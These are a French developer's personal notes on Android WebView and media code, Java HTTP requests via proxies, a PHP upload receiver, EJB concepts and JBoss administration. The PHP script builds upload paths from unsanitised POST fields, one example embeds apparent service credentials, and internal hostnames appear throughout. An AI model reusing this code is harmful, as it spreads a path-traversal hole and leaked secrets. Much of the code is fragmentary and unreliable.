	@TargetApi(Build.VERSION_CODES.JELLY_BEAN_MR1)
    private void setMediaPlayback(WebView bwv) {
        bwv.getSettings().setMediaPlaybackRequiresUserGesture(false);
    }
pour envoyer un message en javascript de ma classe java: 
    marche pas si busy:-( wv.loadUrl("javascript:document.getElementById('chooseProjectDivPb').innerHTML='Get: "+fileName+"';");
detecter un coup de fil en entree et par exemple couper le son en consequence
                dans mon activite:
                    private TelephonyManager telephonyManager;
                  	private PhoneStateListener callStateListener = new PhoneStateListener() 
                  	 {
                  
                  		@Override
                  		public void onCallStateChanged(int state, String incomingNumber) {
                  			// TODO Auto-generated method stub
                  			super.onCallStateChanged(state, incomingNumber);
                  			      switch (state) { voir LINKswcthfdf
                  			          case TelephonyManager.CALL_STATE_RINGING:
                  			          // called when someone is ringing to this phone
                  			        	  mute();
                  			  	    	wv.loadUrl("javascript:document.getElementById(lecteur).pause();");
                  			          break;
                  			      }
                  			  }
                  	};
                @Override
                  	protected void onDestroy() {
                  		// TODO Auto-generated method stub
                  		telephonyManager.listen(callStateListener, PhoneStateListener.LISTEN_NONE);
                  		super.onDestroy();
                  	}
pour masquer le clavier 
  jai mis dans oncreate: 
  getWindow().setSoftInputMode(WindowMan ager.LayoutParams.SOFT_INPUT_STATE_ALW AYS_HIDDEN);
pour rajouter un bouton et customiser le mediacontroller du videoplayer: 
        public class VideoController extends MediaController {
        
        private Button searchButton;
        public VideoController(Context context) 
        {
            super(context);
        }
        public void setAnchorView(View view) {
            super.setAnchorView(view);
        
            Button autoRepet = new Button(this.getContext());
            autoRepet.setText("Search");
            autoRepet.setBackgroundResource(R.drawable.autoRepet);
            ou
                  if (Build.VERSION.SDK_INT >= 16) {
                          autoRepet.setBackground(animation);
                      } else {
                          autoRepet.setBackgroundDrawable(animation);
                      }
            FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);
            params.gravity = Gravity.RIGHT;
            addView(autoRepet, params);
        }
    et dans mon activite : 
            VideoView vw=new VideoView(this); 
                VideoController mediaController = new VideoController(this);
                 mediaController.setAnchorView(vw);
                vw.setMediaController(mediaController);
                Intent intent = getIntent();
                vw.setVideoPath(intent.getStringExtra("url"));
                setContentView(vw);
                vw.start();
pour mettre une image de fond dans un widget dans le main: 
          android:background="@drawable/spinner"
  et dans la classe java:
        stopbutton.setBackgroundResource(R.drawable.stopbutton);
pour mettre une image dans le main.xml
    <ImageView android:layout_height="wrap_content" android:layout_width="wrap_content" android:src="@drawable/startstop" android:id="@+id/imageView1" android:layout_below="@+id/normrec" android:layout_toRightOf="@+id/startbutton" android:layout_above="@+id/keep"></ImageView>
pour demarrer une autre activite a partir d'une activite: 
      	public void startIc2Activity()
      	{
      		Intent it = new Intent(this,IceCream2Activity.class);
      		this.startActivity(it);
      	}
      	puis dans le manifest: 
      	        <activity android:name=".MaPremiereActiviteMere"  android:label="@string/app_name">
                  <intent-filter>
                      <action android:name="android.intent.action.MAIN" />
                      <category android:name="android.intent.category.LAUNCHER" />
                  </intent-filter>
              </activity>
              <activity android:name=".MonActiviteFille" android:label="@string/app_name">
      		            <intent-filter>
      		                <action android:name="android.intent.action.MaPremiereActiviteMere" />
      		                <category android:name="android.intent.category.LAUNCHER" />
      		            </intent-filter>
       </activity>
pour demarrer une activite en lui envoyant un url:
      mon activite 1:  
        Intent it = new Intent(StartLoop.this,WebViewActivity.class);
        it.putExtra("url","www.kanail.net");
        StartLoop.this.startActivity(it); // recuperer la classe parente
      mon activite2:
si je demarre une activite suite à une methode javascript ca va faire l'erreur Error calling method on NPObject on Android
    dans ce cas dans le java faire:  
      runOnUiThread(new Runnable() {
            public void run() {
                //Code that interact with UI
            }
        });       
pour faire un lien avec UI et ce lien pointe vers une webview qui vas vers une url:
       about = (TextView) findViewById(R.id.infoTxtCredits);
       about.setOnTouchListener(new View.OnTouchListener(){
       //recuperer l'extra:
         Intent intent = getIntent();
          String toto = intent.getStringExtra("url");
		@Override
		public boolean onTouch(View v, MotionEvent event) {
			wv=new WebView(StartLoop.this);
		        setContentView(wv);
			wv.loadUrl("www.google.com");
			return false;
		}
    	   
       });      
pour appeler n'importe quelle classe (qui peut etre une activite, un service etc.. ) avec un intent
		Intent callingIntent = new Intent(context, LaClasseQueJeVise.class);
	    callingIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	    callingIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
	    service.startActivity(callingIntent);
		
 	   
Les fichiers dans audioloop sont dans 
    data/data/monPackage/files
pour faire de la pub avec googleadd :
    dans mon activite: 
      import com.google.ads.AdRequest;
      import com.google.ads.AdSize;
      import com.google.ads.AdView;
      Class... 
      	private AdView adView;
      	onCreate...
      	 // Create the adView
          adView = new AdView(this, AdSize.BANNER, MY_AD_UNIT_ID);
          // Add the adView to it
              layout.addView(adView);
          // Initiate a generic request to load it with an ad
              adView.loadAd(new AdRequest());
        ... 
        	  public void onDestroy() 
            {
        	    adView.destroy();
        	    super.onDestroy();
        	  }
pour cesser une activite quand on appuye sur le bouton retour arriere:
  @Override
  	public void onBackPressed() {
  		// TODO Auto-generated method stub
  		super.onBackPressed();
  		MemoclapLookPhotoCanvas.this.finish();
  	}
  	
pour jouer un fichier audio avec mediaplayer il vaut mieux proceder comme ca :
        File file = new File(pathFile);
		    FileInputStream fis = new FileInputStream(file);
		    monMediaPlayer.setDataSource(fis.getFD());

  si j'ai le message : Failed to install *.apk on device *: timeout
      Windows>Preferences>Android>DDMS>augmenter le timeout
  utilistion du sensor: 
    pas fait voir walkstraight  
  utilisation du timer squeduler regulier : (thread) voir plus bas "timer" LINKTimersdkjsq
  	   public void onCreate() 
       {
            		  	timer = new Timer();
            		  	  //schedule et scheduleatfixedrate: (fixedrate rattrape vite le temps perdu)
            		 timet = new TimerTask() {
            				
            				@Override
            				public void run() 
                      {
                        ...
              				}
            			};
         		  	  timer.schedule(timet, Integer.parseInt(params[0].trim())*1000, Integer.parseInt(params[0].trim())*1000);


       }
        public void onStart(Intent intent, int startId) { 
            timer.schedule(timet, Integer.parseInt(params[0].trim())*1000, Integer.parseInt(params[0].trim())*1000);
        }
        public void onDestroy() {
            		timet.cancel();
            		timer.purge();
            		timer.cancel();
            		super.onDestroy();
            	}
  si le lancement d'emulateur ne peut pas se faire sur eclipse: pour lancer l'emulateur sans passer par eclipse: 
  D:\Program Files\Android\android-sdk>set ANDROID_EMULATOR_DEBUG=1
  D:\Program Files\Android\android-sdk\tools>emulator @MonEmulateur
 pour envoyer une request requete en passant par un proxy passer par un proxy : LINKrequ939302(a lire!!!: http://docs.oracle.com/javase/6/docs/technotes/guides/net/proxies.html) // on peut le faire sur unix pour tout le serveur (les indus le font... comment? chais pas c'est "Ouvrir les flux via le proxy socks frsopslinfv01:1080 tout comme pour APCA")
          	// Pour sortir sur internet il faut specifier un proxy voir si c'est necessaire avec wget
        			
              System.setProperty("http.proxyHost", "webcache.mydomain.com"); attention a ce moment peut etre que toute la jvm passe par le proxy. Il faut peut etre apres desactiver.
            System.setPropery("http.proxyPort", "8080");
            si c'est via TCP (par exemple LDAP) alors faire : 
            	        	System.setProperty("socksProxyHost", "frsopslinfv01.soprahronline.sopra");
            		        System.setProperty("socksProxyPort", "1080");
            		    Sinon
            		        System.setProperty("http.ProxyHost", "frsopslinfv01.soprahronline.sopra");
            		        System.setProperty("http.ProxyPort", "1080");
            puis 
                    System.clearProperty("socksProxyHost");
                    System.clearProperty("socksProxyPort");
                    ou bien
                  System.setProperty("http.proxyHost", null); // meme pour desactiver le socsProxyHost ci dessus
                  ou bien 
                  System.setPropery("http.proxyPort", ""); // si ci dessus ca marche pas avec un nullpointerexception
            autre façon plus propre (mais marche que avec http?)                  
            /*  String proxyHost = System.getProperty("http.proxyHost"); // ou socksProxyHost recupère prop de la jvm voir LINKù*ù   
        			if (proxyHost==null) proxyHost = "10.4.1.8";
        			String proxyPort = System.getProperty("http.proxyPort");// ou socksProxyPort recupère prop de la jvm voir LINKù*ù
        			if (proxyPort==null) proxyPort = "8080"; */
        			Proxy proxy = new Proxy(Proxy.Type.HTTP ou... , new InetSocketAddress(proxyHost, Integer.valueOf(proxyPort)));
        			conn = validationUrl.openConnection(proxy);
        //			conn = validationUrl.openConnection();
        			
        			in = new BufferedReader(new InputStreamReader(conn.getInputStream())); // convertir un inputstream en string
             in.readLine()    ....
            pour annuler desactiver l'utilisation du proxy(http et tcp) quand on en a plus besoin: 
                System.setProperty("http.proxyHost", null); // a mettre dans un finally en general // ou "" à la place de null
de la meme facon que ci dessus on peut faire du ssl en java:Moi client appel serveur par https. le trustore m'a ete donne par le serveur distant.
                        voir LINKAAKJDLKIHE 
  pour uploader un fichier audio du mobile vers le serveur : faire une requete http. voir LINKrequ939302 plus bas      
                  cote mobile : 
                  package pack.coderzheaven;
                                    public boolean localFileToUrlFile(String urlString, File toSend, String targetFileName, Map<String,String> params, String callback ) throws Exception {
                                    try {
                                        HttpURLConnection conn = null;
                                        DataOutputStream dos = null;
                                        DataInputStream inStream = null;
                                        String lineEnd = "\r\n";
                                        String twoHyphens = "--";
                                        String boundary = "----WebKitFormBoundaryKgO64I9QnEKDQB1k";
                                        int bytesRead, bytesAvailable, bufferSize;
                                        byte[] buffer;
                                        int maxBufferSize = 1 * 1024 * 1024;
                                        String responseFromServer = "";
                                        //------------------ CLIENT REQUEST
                                        FileInputStream fileInputStream = new FileInputStream(toSend);
                                        // open a URL connection to the Servlet
                      
                        Methode1: faire une requette request requete get ou post LINKrequ939302
                                        URL url = new URL(urlString);
                                        // Open a HTTP connection to the URL
                                        conn = (HttpURLConnection) url.openConnection();
                                        // Allow Inputs
                                        conn.setDoInput(true);
                                        // Allow Outputs
                                        conn.setDoOutput(true);
                                        // Don't use a cached copy.
                                        conn.setUseCaches(false);
                                        // Use a post method.
                                        conn.setRequestMethod("POST");
                                        conn.setRequestProperty("Connection", "Keep-Alive"); // ca ca ajoute un header a la requette http post: 1er argument= clé 2e=value(peut etre au format "x:y" ou "x;y"...)
                                        conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                                        String basicAuth = "Basic " + new String(new Base64().encode("unuser:unpassword".getBytes()));
                                        conn.setRequestProperty("Authorization",basicAuth); 
httpURLConnection.addRequestProperty((String) header.getKey(), (String) header.getValue());
                                        dos = new DataOutputStream(conn.getOutputStream());                             
                            // fichier
                                        dos.writeBytes(twoHyphens + boundary + lineEnd);
                                        dos.writeBytes("Content-Disposition: form-data; name=mfile ;filename=ans"+lineEnd); // alors $_FILES['mfile']['name'] = ans
                                        dos.writeBytes(lineEnd);
                                        // create a buffer of maximum size
                                        bytesAvailable = fileInputStream.available();
                                        bufferSize = Math.min(bytesAvailable, maxBufferSize);
                                        buffer = new byte[bufferSize];
                                        // read file and write it into form...
                                        bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                            
                                        while (bytesRead > 0) {
                                            dos.write(buffer, 0, bufferSize);
                                            bytesAvailable = fileInputStream.available();
                                            bufferSize = Math.min(bytesAvailable, maxBufferSize);
                                            bytesRead = fileStream.read(buffer, 0, bufferSize);
                                        }
                                        dos.writeBytes(lineEnd + twoHyphens + boundary + lineEnd);
                            
                            // params           (POST)
                                        String stringForLength = new String();
                                        Iterator<String> it = params.keySet().iterator();
                                        while (it.hasNext()) {
                                            String key = it.next();
                                            String value = params.get(key);
                                            stringForLength += "Content-Disposition: form-data; name=\"" + key + "\"" + lineEnd;
                                            stringForLength += "Content-Type: text/plain;charset=UTF-8" + lineEnd + "Content-Length: " + value.length() + lineEnd + lineEnd; // content-length c la taille du nombre de char LINKcontentlengh
                                            stringForLength += value;
                                            stringForLength += lineEnd + twoHyphens + boundary + lineEnd;
                                        }
                                        dos.writeBytes(stringForLength);
                            
                                        fileInputStream.close(); // pas besoin si je fais try(Writer writer = new FileWriter(unfichier)){
                            
                                        dos.flush();
                                        dos.close();
                                        //------------------ read the SERVER RESPONSE
                            
                                        inStream = new DataInputStream(conn.getInputStream());
                                        String str;
                                        int res=0;
                                        res = inStream.readInt();
                                        if (res==0)
                                        {
                                            wv.post(new Runnable() {
                                                @Override
                                                public void run() {
                                                    wv.loadUrl("javascript:sendMessage('messageJava', 'Envoi impossible pas de reseau');");
                                                }
                                            });
                                        }
                                        else
                                        {
                                            wv.post(new Runnable() {
                                                @Override
                                                public void run() {
                                                    wv.loadUrl("javascript:sendMessage('messageJava', 'OK');");
                                                }
                                            });
                                        }
                            
                                        inStream.close();
                            /*                    wv.post(new Runnable() {
                                                    @Override
                                                    public void run() {
                                                        wv.loadUrl("javascript:"+callback+"');");
                                                    }
                                                });
                            */
                                        return true;
                            
                                    } catch (Exception e) {
                                        System.out.println(e);
                                        return false;
                            
                                    }
                                    
                                    
                              // params (GET)
                                              private static final String USER_AGENT = "Mozilla/5.0";
                                              URL obj = new URL(GET_URL);
                                          		HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                                          		ou 
                                          		HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
                                          		con.setRequestMethod("GET");
                                          		con.setConnectTimeout(5000);  // pour limiter le test de connection à 5 secondes. renverra une SocketTimeoutException 
                                          		con.setRequestProperty("User-Agent", USER_AGENT);
                                          		int responseCode = con.getResponseCode();
                                          		System.out.println("GET Response Code :: " + responseCode);
                                          		if (responseCode == HttpURLConnection.HTTP_OK) { // success
                                          			BufferedReader in = new BufferedReader(new InputStreamReader(
                                          					con.getInputStream()));
                                          			String inputLine;
                                          			StringBuffer response = new StringBuffer();
                                          
                                          			while ((inputLine = in.readLine()) != null) {
                                          				response.append(inputLine);
                                          			}
                                          			in.close();
                                          
                                          			// print result
                                          			System.out.println(response.toString());
                                          		} else {
                                          			System.out.println("GET request not worked");
                                          		}
                               AUTRE Methode 1 (meme principe meme classe) http request post
                                  NOUVELLE METHODE LINKrequ939302: pour faire un http post // c'est mieux que apache.http
                         //surl = "http://95.142.162.203:8085/transport/ws/login/true/toto";
                                        URL url = new URL(surl);
                                        HttpURLConnection conn= (HttpURLConnection) url.openConnection();
                                
                                        try {
                                            String data =  paramname+"="+paramvalue;            pour un post ca se met comme ca dans le body du post : paramname+"="+paramvalue;
                                            String data="cl_pwd=pc4jrmt4&" +
                                                          "prot_vers=2&" +
                                                          "cl_login=EVAL_VAAS&" +
                                                          "cl_app=EVAL_7647339&" +
                                                          "req_voice=sharon22k&" +
                                                          "req_text=Bonjour&" +
                                                          "req_asw_type=SOUND";
                                            conn.setRequestMethod("POST");
                                      conn.setRequestProperty(“Key”,”Value”);
                                            conn.setDoInput(true);
                                            conn.setDoOutput(true);
                                            conn.setFixedLengthStreamingMode(data.getBytes().length);
                                //            conn.setChunkedStreamingMode(0); si on ne connait pas la taille de l'envoi
                                            OutputStream dos=new BufferedOutputStream(conn.getOutputStream());
                                            ou 
                                            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                                      writeStream(outputPost);// voir ci-dessous
                                            dos.write(data.getBytes());
                                            dos.flush();
                                      dos.close();
                                            InputStream in = new BufferedInputStream(conn.getInputStream());
                                            BufferedReader reader = new BufferedReader(new InputStreamReader(in));
                                            StringBuilder result = new StringBuilder(); //= StringBuffer mais StringBuilder n'est pas threadsafe et est immutable
                                            String line;
                                            while ((line = reader.readLine()) != null) {
                                                result.append(line);
                                            }
                                            return result.toString();
                                        }
                                            catch(MalformedURLException error) {
                                                    //Handles an incorrectly entered URL
                                            }
                                            catch(SocketTimeoutException error) {
                                            //Handles URL access timeout.
                                            }
                                            catch (IOException error) {
                                            //Handles input and output errors
                                            }
                                        finally {
                                      if(conn != null) // Make sure the connection is not null.
                                      conn.disconnect();
                                        }

                                Methode 2: faire une requete post post request avec apache.http qui est c plus vieux et moins bien que HttpURLConnection.:  LINKrequ939302
                                                 voir les exemples :https://hc.apache.org/httpcomponents-client-ga/examples.html
                                                HttpClient httpClient = new HttpClient();
                                              		PostMethod postMethod = new PostMethod(this.location_UneURL);
                                              		postMethod.addHeader(new org.apache.http.message.BasicHeader("Content-Type", "application/x-www-form-urlencoded; charset=" + "UTF-8".toLowerCase())); // ajouter des headers
                                              		post.addHeader(new org.apache.http.message.BasicHeader("Content-MD5", contentMD5));
                                              		java.util.List<org.apache.http.NameValuePair> nP = new java.util.ArrayList<org.apache.http.NameValuePair>(); // ajout de parametres methode 1
                                              		    nP.add(new org.apache.http.message.BasicNameValuePair(p1, v1));"param 1" et "valeur1" sont des strings
                                                      nP.add(new org.apache.http.message.BasicNameValuePair(p2, v2));
                                                      nP.add(new org.apache.http.message.BasicNameValuePair(p3, v3));
                                                     postMethod.setEntity(new org.apache.http.client.entity.UrlEncodedFormEntity(nP, "UTF-8"));                                                     
                                              		NameValuePair[] body ={new NameValuePair("RBONResponse",encodedRbonResponse)}; // ajout de parametres methode 2
                                                  postMethod.setRequestBody(body);
                                                  // operate
                                              		int resultStatusCode = httpClient.executeMethod(postMethod); OU org.apache.http.HttpResponse response = client.execute(postMethod);
                                                    // verify
                                              		LOG.debug("result: " + resultStatusCode);
                                              		  //assertEquals(HttpServletResponse.SC_MOVED_TEMPORARILY, resultStatusCode);
                                              		Header locationHeader = postMethod.getResponseHeader("Location");
                                              		String value = locationHeader.getValue();
                                              		  //assertEquals(this.location + "/target-page", value);
                                
                    cote serveur :
                    <?php
                               $idp= $_POST["idp"];
                                $uid= $_POST["uid"];
                                $fs= $_POST["fs"];
                                $fichier = $_FILES['mfile']['name'];
                                if (isset($_POST['uid']))
                                {
                                	$path="sons/".$idp."/ANS/".$uid."/".$fs;
                                }
                                else
                                {
                                	$path="sons/".$idp."/ANS/anonymous/".$fs;
                                }
                                if (!is_dir($path))
                                {
                                	mkdir($path, 0755, true);
                                }
                                // fin cree le repertoire si n'existe pas
                                $download_path = "uploads/";
                                $download_path = $download_path . basename($fichier);
                    
                                if(move_uploaded_file($_FILES['mfile']['tmp_name'], $path."/ans.ogg")) {
                                echo "OK";
                                } else{
                                	echo "KO";
                                }
                         ?>
                      
  firefox :
    pour exporter mes plugin firefox:
          utiliser le plugin FEBE 
    on peut rajouter des modules de recherche firefox sous: 
          C:\Program Files\Mozilla Firefox\searchplugins
          placer un fichier xml tel que : 
                                        <!--
                                    	Firefox Search Plugin
                                    	Author: Kevin Foster Kevin.Foster(a)corp.aol.com
                                    	Created: 28 November 2006
                                    	Last Update: 24 March 2008
                                    	Version 5.0
                                    	
                                    	Country: US
                                    	Language: en
                                    	
                                    	Note: The invocationType param is used to let AOL know that searches
                                    	conducted from the Firefox Search bar are coming from Firefox.
                                    -->
                                    <OpenSearchDescription xmlns="http://a9.com/-/spec/opensearch/1.1/"
                                                          xmlns:moz="http://www.mozilla.org/2006/browser/search/">
                                    <ShortName>Renault search</ShortName>
                                    <Description>Renault intranet recherche</Description>
                                    <InputEncoding>UTF-8</InputEncoding>
                                    <Image width="16" height="16">data:image/png,%89PNG%0D%0A%1A%0A%00%00%00%0DIHDR%00%00%00%10%00%00%00%10%08%06%00%00%00%1F%F3%FFa%00%00%00%06bKGD%00%FF%00%FF%00%FF%A0%BD%A7%93%00%00%00%09pHYs%00%00%00H%00%00%00H%00F%C9k%3E%00%00%00%FAIDAT8%CB%9D%D3%B1q%C2%40%10%85%E1%0F%8F%0B%A0%04%97%00%1D%40%05%C6%01%B9%95*1%AA%C0C%05%E0%84%D4%E4%0A%0C%15H%EE%40%1D%98%12%D4%81%1D%E84%C8B%60%C9%2F9%AD%EE%EE%9F%DD%B7%7B%23%B0%DC%7D%A3D%22%8D%F7%06h%D4%00%D4*%02(%EF%03%B8%EB%F87Af%B9%7B%EF%03%B8o%C59%DE%A4%F1%E1%3F%25%EC%91%60%83%87%B0%FF%89m%F8%5Et%F9S%032%3C%E1%0B%E3%D6%99%02s%7C%848%91%C6E%1B0%C1%0B%9E%AFd%9A%E0%D4%80l%B1%96%C6eebE%9C%DC(%F51dRk%15%B2%FD%D5%85%B1a*%CF%80%AA%84%FC%C6%E1%23f%8Dx%8D)%E76n%10aq%C5%C4%03%B2%B0%26%D2%F8To%D6%80Y0q%8AW%97m%1C%23%EA%9A%CE%E6%20%AD%82%91%5D%83T%AA%BAp%A1%AE%B7Pk%2F%8D%A3%BF%9C%ECz%0B9%E6%7D.7K(%C3%3A%F89%FF%00_%82G%C3%D5%0E(%3E%00%00%00%00IEND%AEB%60%82</Image>
                                    <Url type="text/html" method="GET" template="http://phare.intra.renault.fr/rse/servlet/phare">
                                     <Param name="qtext" value="{searchTerms}"/>
                                    </Url>
                                    <moz:SearchForm>http://phare.intra.renault.fr/rse/servlet/phare</moz:SearchForm>
                                    </OpenSearchDescription>
                                    
ejbs :
  ejb 2 :
    http://jmdoudoux.developpez.com/cours/developpons/java/chap-ejb.php#ejb
 ejb :3.0,3.1
    on utilise les annotation et pour les besoins plus specifiques on ajoute du metadata dans ejb-jar.xml(facultatif en 3.1. Peut etre vide dans 3.0)
    si pas d'annotations: le container utilise des valeurs par defaut
  ------------------
  type            annotation
  // session bean est le seul ejb qu'on peut appeller remotely
  SessionBean     @Stateless // n'a pas de donnees de l'interaction avec client c a d : seul un client accède à ce bean à un instant donne, il n'est pas persistent, le bean est un webservice. On peut avoir plusieurs clients qui accedent a ce bean mais c'est pour chacun une relation 1client-1bean (pooled)                                        
                  @Statefull  // contient des donnees de l'interaction avec le client c a d : thread-safe: il cree autant d'instance indep que de client
                        //stateless et statefull ne supportent pas d'acces concurents sur un meme bean.
                  @Singleton // uniquement EJB 3.1 : un seul ejb bean pour tout le monde.(tout les clients): cree par le container au demarrage sauf si lazy-loading
  Message Driver  @MessageDriven // on ne peut le joindre qu'avec des messages à l'interieur du container (du serveur) par des Message Bus
  JPA Entities    @Entity
                  @EntityManager
  ------------------
  type            annotation
  SessionBean     @Local ---> l'accès à ces beans ne peut se faire que par d'autres beans du meme EJB (même contexte, même classLoader)
                  @LocalBean ---> >=EJB 3.1  : bean sans interface necessaire.
                  @Remote ---> Bean de l'EJB peut être accede de l'exterieur de son classLoader   
                  @WebService
  Message Driver  @WebService
  JPA Entities    N/A
  ------------------
  type            annotation
  Container-Managed mode    Le plus utilise: le container s'occupe des Transactions, Roles, Security, Persistence et Entities 
  Bean-Managed mode         le developpeur doit lui même gerer le reste. Le container gere seul Transatction et Persistence
  ------------------                                                     
  LifeCycle des instances d'EJB:
        N'existe pas
              V
        si on fait un appel jndi:lookup à l'ejb ou injection de dependance) 
              V
        PostConstruct (pas encore de proxy)
              V
        Ready : container cree automatiquement le proxy et les instances d'EJB : Client <---->proxy<---->Instances d'EJB 
              V        
        Pre-Removal : a lieu si on arrete le serveur ou on undeploy ou Existe erreur critique ou le client disparait(ne se connecte plus pdt untemps) dans le cas d'un StatefullBean ou si j'appelle une methode du bean qui a en tête l'annotation @Remove
  -------------------
 import javax.ejb.Local;
 @Local ou @Remote ou @WebService...(name=blah; jndi-path=blih) //(value=pair) est facultatif
 MonBusinessInterface (logique et est accessible par le jndi)
    //signatures methodes metiers
        public int add(int a, int b);
        ...
@Stateless ou @Statefull ou @Singleton // facultatif (mappedName="monlookupnomdebean")        
 MonBusiness implements MonBusinessInterface // EJB3.1 pas besoin d'implementer: on rajoute juste au dessus de [@Stateless ou @Statefull ou @Singleton]: [@LocalBean ou @Remote ou @WebService] et le container genère l'interface à la volee
 {
  ca doit etre la seule sous classe de cette interface depuis EJB3.0
  ...mes methodes implementees...
 }
//1 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) par injection de dependance 
 public class Main
 {
  @EJB ou @Ressources (c'est pareil)// injection de dep: le container trouve tout seul grace au nom de ma classe mon bean EJB en cherchant tout seul dans le jndi. // il faut avoir qu'une seul sous classe de cette interface pour que ca marche
                      // facultatif (name="monlookupnomdebean")
  static MonInterfaceDeBeanDEJB ejbbean;
  public static void main(String[] args)
  {
     String toto = ejbbean.calcule(4,2);
  }
//2 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) remotely avec JNDI 
 public class Main
 {
  static MonInterfaceDeBeanDEJB ejbbean;
  public static void main(String[] args)
  {
    Context c = new InitialContext();
    ejbbean = (MonInterfaceDeBeanDEJB) c.lookup("com.path.jndi.MonInterfaceDeBeanDEJB");
    String toto = ejbbean.calcule(4,2);
  }
 }
    String toto = ejbbean.calcule(4,2);
  }
 } 
//2 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) remotely avec JNDI 
 public class Main
 {
  static MonInterfaceDeBeanDEJB ejbbean;
  public static void main(String[] args)
  {
    Context c = new InitialContext();
    ejbbean = (MonInterfaceDeBeanDEJB) c.lookup("com.path.jndi.MonInterfaceDeBeanDEJB");
    String toto = ejbbean.calcule(4,2);
  }
 }
jboss : 
les fichiers compiles et jsp sont sous : C:\jbdevstudio4\jboss-eap\jboss-as\server\default\tmp\
console jboss : http://localhost:8080/jmx-console/
la config connection arca est sous : C:\jbdevstudio4\jboss-eap\jboss-as\server\default\conf\login-config.xml
Les logs : 
    les fichiers log4j si ils sont presents dans le classpath du war prennent la main sur le fichier jboss-log4j.xml qui est sur le serveur 
Si wec plante en prod essayer ca :
      Rached :
      ./VerifApp.ksh
      ./VerifAS.ksh
      il faut arreter les semaphores qui loquent avec peut etre ca: semaphore = un objet qui envoie des messages (je crois)
      les scripts d'arret relance de l'AS sont dans /jboss/scripts/expl/ (a executer en tant que JBOSS)
      ./shutdown.sh S07AS01
      ./run.sh S07AS01
      /jboss/jboss-ews-1.0/httpd/sbin/httpd -f /jboss/jboss-ews-1.0/httpd/conf/S07AS01-0.httpd.conf -k start
      si ca ne marche pas peut etre killer les process http sur S07AS01
si le deployement plante en recette :
        Lessard Guillaume
                java.lang.Exception:No bundle plugin supports bundle type [BundleType[id=10001,name=Ant Bundle]](qu'on peut voir seulement dans la console)
                j'ai du faire un purge-data de l'agent puis le redemarrer (au cas où tu retombes sur l'erreur)
demande de creation d'une autre base doublon duplication : 12AUG28-32115 
pour faire demarer en remote sous eclipse:
        program arguments: 
        -c default --host=10.230.208.16
jboss-classloader.xml:        
    name - typically the name of war or ear, e.g. “myapp.war”
    import-all – (“true”/”false”) – true means make all classes exported from other applications visible to this application
    export-all – value “NON_EMPTY” – all classes are exposed to other applications
    domain – a classloading domain, can be an arbitrary name but typically you will want to name it the name of your application, e.g. “myapp.ear” or “myapp.war”. If a domain by that name already exists, your app will join that classloading domain.
    parent-domain – default is “DefaultDomain” which is shared with all other applications that don’t specify a domain.  If you prefer to delegate to an explicit parent domain when a class is not found in yours, then specify an existing domain here, as in delegating to an EAR’s domain, e.g. “myapp.ear”
    top-level-classloader – used to enable embedded apps, such as a war within an EAR, to participate in a top-level domain (see JBCL-125)
    parent-first (“true”/”false”) – if false, the app is in non-j2ee compliance mode, where the app’s domain is searched first for a class before searching the parent domain.  The default for top-level deployed WARs is “false”, however, I have found that the default behavior for WARs within EARs is “true”
 Configurer une connexion à un serveur jms mq sur un bundle jboss : 
          bundle-sfd.zip/sfd.zip/sfd-jmsmq-ds.xml
                      <?xml version="1.0" encoding="UTF-8"?>
                      <connection-factories>
                              <no-tx-connection-factory>
                                      <rar-name>wmq.jmsra.rar</rar-name>
                                      <jndi-name>sfd/jms/Factory</jndi-name>
                                      <use-java-context>false</use-java-context>
                                      <connection-definition>javax.jms.QueueConnectionFactory</connection-definition>
                                      <config-property type="java.lang.String" name="hostName">su215aos.mc2.renault.fr</config-property>
                                      <config-property type="java.lang.String" name="port">1416</config-property>
                                      <config-property type="java.lang.String" name="channel">FRROSFD1.CHS.T1</config-property>
                                      <config-property type="java.lang.String" name="transportType">CLIENT</config-property>
                              </no-tx-connection-factory>
                      
                              <mbean code="org.jboss.resource.deployment.AdminObject" name="webspheremq.queue:name=sfd/jms/sfd_IQA2ASFD">
                                      <attribute name="JNDIName">sfd/jms/CLIPReceipt</attribute>
                                      <depends optional-attribute-name="RARName">jboss.jca:service=RARDeployment,name='wmq.jmsra.rar'</depends>
                                      <attribute name="Type">javax.jms.Queue</attribute>
                                      <attribute name="Properties">
                                              baseQueueManagerName=FRROSFD1
                                              baseQueueName=IQA2ASFD
                              </attribute>
                              </mbean>
                      
                              <mbean code="org.jboss.resource.deployment.AdminObject" name="webspheremq.queue:name=sfd/jms/sfd_IQGARBVM02MQ">
                                      <attribute name="JNDIName">sfd/jms/BVMRequest</attribute>
                                      <depends optional-attribute-name="RARName">jboss.jca:service=RARDeployment,name='wmq.jmsra.rar'</depends>
                                      <attribute name="Type">javax.jms.Queue</attribute>
                                      <attribute name="Properties">
                                              baseQueueManagerName=FRROSFD1
                                              baseQueueName=IQGARBVM02MQ
                              </attribute>
                              </mbean>
                              <mbean code="org.jboss.resource.deployment.AdminObject" name="webspheremq.queue:name=sfd/jms/sfd_IRSFDBVM01">
                                      <attribute name="JNDIName">sfd/jms/BVMResponse</attribute>
                                      <depends optional-attribute-name="RARName">jboss.jca:service=RARDeployment,name='wmq.jmsra.rar'</depends>
                                      <attribute name="Type">javax.jms.Queue</attribute>
                                      <attribute name="Properties">
                                              baseQueueManagerName=FRROSFD1
                                              baseQueueName=IRSFDBVM01
                              </attribute>
                              </mbean>
                                   <mbean code="org.jboss.resource.deployment.AdminObject" name="webspheremq.queue:name=sfd/jms/sfd_UDA2ASRVRSPIN">
                                      <attribute name="JNDIName">sfd/jms/CLIPEmitRnfi</attribute>
                                      <depends optional-attribute-name="RARName">jboss.jca:service=RARDeployment,name='wmq.jmsra.rar'</depends>
                                      <attribute name="Type">javax.jms.Queue</attribute>
                                      <attribute name="Properties">
                                              baseQueueManagerName=FRROSFD1
                                              baseQueueName=UDA2ASRVRSPIN
                              </attribute>
                              </mbean>
                                   <mbean code="org.jboss.resource.deployment.AdminObject" name="webspheremq.queue:name=sfd/jms/sfd_UDA2AUDB">
